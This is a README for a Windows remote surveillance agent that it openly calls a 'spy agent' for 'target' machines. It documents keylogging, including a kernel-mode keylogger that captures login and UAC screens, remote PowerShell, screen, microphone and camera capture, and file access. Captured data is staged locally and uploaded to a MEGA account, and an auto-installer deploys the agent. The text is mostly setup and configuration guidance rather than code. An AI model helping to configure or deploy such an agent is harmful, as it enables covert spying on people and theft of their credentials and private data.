# RMAC Host-Client

The RMAC Host-Client (also referred to as RMAC Client) is the actual spy agent running on the target host machine, it makes calls to the RMAC API Server and is always connected to the RMAC Bridging Server for as-long-as its online.

### Functionalities

- Keylogging
- [Secure Context Keylogging](https://github.com/saurabh-prosoft/rmac/tree/main/host-client#what-is-secure-context-keylogging) (only works when [RMAC KMKL](https://github.com/saurabh-prosoft/rmac-drivers#readme) Driver is installed)
- Interactive remote Powershell command-line via [RMAC Console](https://github.com/saurabh-prosoft/rmac/tree/main/console#readme)
- Screen Recording
- Audio Recording
- Camera capture
- File system access
- Upload to configured MEGA account

## Configuration

Following minimum configuration is required to be specified in `config.rmac` for Host-Client to work:

```config
ApiServerUrl=https://your-rmac-api-server.com/api
BridgeServerUrl=https://your-rmac-bridge-server.com
ClientName=<a-unique-client-name>
MegaUser=Megausername
MegaPass=Megapassword
```

### Available config options

- `ApiServerUrl` - The RMAC API Server URL
- `BridgeServerUrl` - The RMAC Bridge Server URL
- `ClientName` - A unique name for the client
- `MegaUser` - The MEGA account username in which the content needs to be uploaded
- `MegaPass` - The MEGA account password
- `VideoDuration` (Default: 600000) - Duration for screen recordings in milliseconds
- `FPS` (Default: 20) - The framerate for screen recordings
- `KeyLogUploadInterval` (Default: 600000) - Interval for key-log dumps
- `LogFileUpload` (Default: true) - Whether to enable upload of key-log dumps to MEGA account
- `VideoUpload` (Default: true) - Whether to enable upload of screen recordings to MEGA account
- `MaxStagingSize` (157286400) - Size limit for staging directories in bytes ([what is staging?](https://github.com/saurabh-prosoft/rmac/tree/main/host-client#staging))
- `MaxStorageSize` (2147483648) - Size limit of pending uploads storage in bytes
- `MaxParallelUploads` (3) - No. of files that can be uploaded in parallel
- `FetchCommandPollInterval` (5000) - Polling interval for fetching [control commands](https://github.com/saurabh-prosoft/rmac/tree/main/api-server#control-commands-buffer) from RMAC API Server in milliseconds
- `ScreenRecording` (true) - Whether to enable screen recording
- `AudioRecording` (true) - Whether to enable Audio Recording
- `ActiveAudioRecording` (false) - Enable or disable active (always-on) audio recording, by default passive recording is enabled which monitors default microphone usage by other programs and records only if its being used, unlike Active Audio Recording which will record audio from default microphone at all times.
- `KeyLog` (true) - Whether to enable key-logging
- `ClientHealthCheckInterval` (3000) - The interval in milliseconds for health check pings on RMAC Host-Client, if health check fails, RMAC Host-Client will try to re-start.

### What is Secure Context Keylogging ?

RMAC Host-Client supports two types of key-logging, a normal key-logger that only works when the system is logged-in, and another keylogger which works even on Windows Login screens and [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) pop-ups.

This is possible using the RMAC Kernel Mode Key Logger ([RMAC KMKL](https://github.com/saurabh-prosoft/rmac-drivers#readme)) which is a Windows kernel-mode filter driver

> Note: To install RMAC KMKL driver on the target host, admin rights are required !

### What is staging ?

When RMAC Host-Client is offline (no internet connection or failing to upload content to MEGA account), it stores all the recorded data (key-logs, screen recordings, RMAC KMKL dumps and other files) at a single place called the `archives` directory

The `archives` contains sub-directories called as `staging` directories for holding specific types of files:

**/archives** - The root directory for staging and archiving

**/archives/screen** - Staging directory to hold screen recordings that could not be uploaded (for e.g. due to no internet connection)

**/archives/key** - Staging directory to hold keylogs

**/archives/other** - Staging directory to hold all other files except the above.

**/archives/pending** - Directory to hold all generated zip archives of staging folders (screen/key/other) that will be uploaded when network is up again

Each archive staging directory (screen/key/other) has a maximum directory size that can be configured using `MaxStagingSize` config option, when size reaches the limit, all the files under this staging directory gets zip archived and moved to `/archives/pending` directory, from where the zip will be uploaded when network is up.

The directory `/archives/pending` also has a configurable maximum size `MaxStorageSize`, when this size is reached, older archives will be deleted to make space for new ones.<br/> This behaviour makes sure that data collection won't fill up host machine's storage when network is down for a long time.

## Runtime

For RMAC Host-Client to be functional, a set of runtimes, programs and tools are required to be present on the target host and the path to this Runtime folder needs to be passed as an argument whenever starting RMAC Host-Client jar.

All of this is packaged in a single archive known as RMAC Runtime, this runtime comes bundled within the `auto-installer.exe` found in the [release](https://github.com/saurabh-prosoft/rmac/releases) and it will setup everything and start the Host-Client automatically if you're following the [Automatic setup](https://github.com/saurabh-prosoft/rmac#automatic-setup-recommended) guide.

Following tools are required/used by RMAC Host-Client:

- [OpenJDK](https://www.openlogic.com/openjdk-downloads) - The Java Runtime Environment
- [FFmpeg](https://ffmpeg.org/) - For screen recording
- [NirCmd](https://www.nirsoft.net/utils/nircmd.html) - Utility commands (might be removed from future releases)
- [SVCL](https://www.nirsoft.net/utils/sound_volume_command_line.html) - To determine the default microphone
- [MEGAcmd](https://mega.io/cmd) - To upload content to the configured MEGA account

## Runtime Compatibility

### Following table outlines the compatible versions of Runtime Packages and RMAC Host-Clients

| RMAC Host-Client Version | Runtime Package Version                                                               | Runtime Package Tools                                                                                                                                                          |
| ------------------------ | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| v1.0.0                   | [v1.0](https://dl.dropboxusercontent.com/s/oekklz5gw3uwc09/rmac-runtime-1.0.zip?dl=0) | <ul><li>OpenJDK for Windows x64 [11.0.18+10]</li><li>MEGAcmd [1.6.1.4]</li><li>FFmpeg [version 2022-10-27]</li><li>NirSoft NirCMD [2.86]</li><li>NirSoft SVCL [1.10]</li></ul> |

### Architecture
